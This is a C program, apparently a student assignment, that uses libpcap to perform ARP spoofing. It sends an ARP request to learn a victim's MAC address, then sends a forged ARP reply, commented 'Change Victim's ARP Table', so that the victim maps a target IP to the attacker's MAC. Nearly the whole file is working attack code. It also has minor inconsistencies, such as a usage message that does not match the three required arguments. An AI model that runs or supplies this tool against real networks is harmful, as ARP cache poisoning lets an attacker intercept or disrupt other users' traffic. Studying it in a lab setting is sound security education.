#include <sys/socket.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <stdlib.h>
#include <unistd.h>
#define ETHERNET 1
#define ETHER_HEADER_LEN 14
#define PACKET_SIZE 42
#define ARP_REQUEST 1
#define ARP_REPLY 2

#pragma pack(push, 1)
struct arp_header {
	u_int16_t hard_t;
	u_int16_t pro_t;
	u_int8_t hard_len;
	u_int8_t pro_len;
	u_int16_t opcode;
	u_char s_mac[6];
	u_int8_t s_ip[4];
	u_char t_mac[6];
	u_int8_t t_ip[4];
};

void usage() {
	printf("syntax: pcap_test <interface>\n");
	printf("sample: pcap_test wlan0\n");
}

void send_arp(u_char* packet, u_char *attacker_mac, u_char *victim_mac, u_int8_t *sender_ip, u_int8_t *victim_ip, char mode);
void print_mac_ip(struct arp_header* arp);
void print_mac(u_char *mac);
void print_ip(u_int8_t *mac);
void set_ip_addr(char *input_addr, u_int8_t *ip);
int main(int argc, char* argv[]) {
	int offset = 0;
	int fd, i;
	struct ifreq ifr;
	struct arp_header *re_arph;
	struct ether_header *re_eth;
	u_char attacker_mac[6];
	u_int8_t attacker_ip[4];
	u_int8_t sender_ip[4];
	u_int8_t target_ip[4];
	u_char victim_mac[6];
	u_char packet[42];

	if (argc != 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	char *input_sender_ip = argv[2];
	char *input_target_ip = argv[3];

	set_ip_addr(input_sender_ip, sender_ip);
	set_ip_addr(input_target_ip, target_ip);
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) perror("Fail Socket");
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) perror("Fail ioctl");
	memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	memcpy(attacker_ip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
	send_arp(packet, attacker_mac, (u_char*)"\x00\x00\x00\x00\x00\x00", attacker_ip, sender_ip, 'q'); //Get Victim's Mac_addr
	while (true) {
		pcap_sendpacket(handle, packet, PACKET_SIZE);
		struct pcap_pkthdr* header;
	 	const u_char* re_packet;
		int res = pcap_next_ex(handle, &header, &re_packet); //&packet ethernet start part
		if (res == 0) continue; //can't catch packet
		if (res == -1 || res == -2) break; //can't read packet
		printf("%u bytes captured\n", header->caplen); //modify for assingment

		re_eth = (struct ether_header *)re_packet;
		if(re_eth->ether_type != htons(ETHERTYPE_ARP)) continue;
		re_arph = (struct arp_header*)(re_packet + ETHER_HEADER_LEN);
		if(re_arph->opcode != htons(ARP_REPLY)) continue;
		if(memcmp(re_arph->t_ip, attacker_ip, 4)) continue;
		memcpy(victim_mac, re_arph->s_mac, 6);
		break;
		
	}
	printf("\n==========VICTIM MAC==========\n");
	print_mac(victim_mac);
	printf("==============================\n\n");

	send_arp(packet, attacker_mac, victim_mac, target_ip, sender_ip, 'p'); //Change Victim's ARP Table
	pcap_sendpacket(handle, packet, PACKET_SIZE);
	pcap_close(handle);
	#pragma pack(pop)
	return 0;
}

void send_arp(u_char *packet, u_char *attacker_mac, u_char *victim_mac, u_int8_t * sender_ip, u_int8_t *victim_ip, char mode) {
	struct arp_header *arph;
	int i;

	/* Set Ethernet Packet */
	for(i=0; i<6; i++) {
		if(mode == 'q') packet[i] = '\xff';
		else if(mode == 'p') packet[i] = victim_mac[i];
		packet[i+6] = attacker_mac[i];
	}

	packet[12] = 0x08; packet[13] = 0x06; //ARP
	/* Set ARP Packet */
	arph = (struct arp_header *)(packet+ETHER_HEADER_LEN);
	arph->hard_t = ntohs(ETHERNET);
	arph->pro_t = ntohs(ETHERTYPE_IP);
	arph->hard_len = sizeof(arph->s_mac);
	arph->pro_len = sizeof(arph->s_ip);
	if(mode == 'q') arph->opcode = ntohs(ARP_REQUEST);
	else if(mode == 'p') arph->opcode = ntohs(ARP_REPLY);
	memcpy(arph->s_mac, attacker_mac, 6);
	memcpy(arph->s_ip, sender_ip, 4);
	memcpy(arph->t_mac, victim_mac, 6);
	memcpy(arph->t_ip , victim_ip, 4);
	print_mac_ip(arph);
}

void print_mac_ip(struct arp_header* arp) {
	int i;

	printf("==========SENDER MAC==========\n");
	print_mac(arp->s_mac);
	printf("==========SENDER IP===========\n");
	print_ip(arp->s_ip);
	printf("==========TARGET MAC==========\n");
	print_mac(arp->t_mac);
	printf("==========TARGET IP===========\n");
	print_ip(arp->t_ip);
	printf("==============================\n");
}

void print_mac(u_char *mac) {
	for(int i=0; i<5; i++) printf("%02x:", mac[i]);
	printf("%02x\n", mac[5]);
}

void print_ip(u_int8_t *ip) {
	for(int i=0; i<3; i++) printf("%d.", ip[i]);
	printf("%d\n", ip[3]);
}

void set_ip_addr(char *input_addr, u_int8_t *ip) {
	char *temp_ip;
	temp_ip = strtok(input_addr, ".");

	for(int i=0; i<4; i++) {
		ip[i] = atoi(temp_ip);
		temp_ip = strtok(NULL, ".");
	}
}

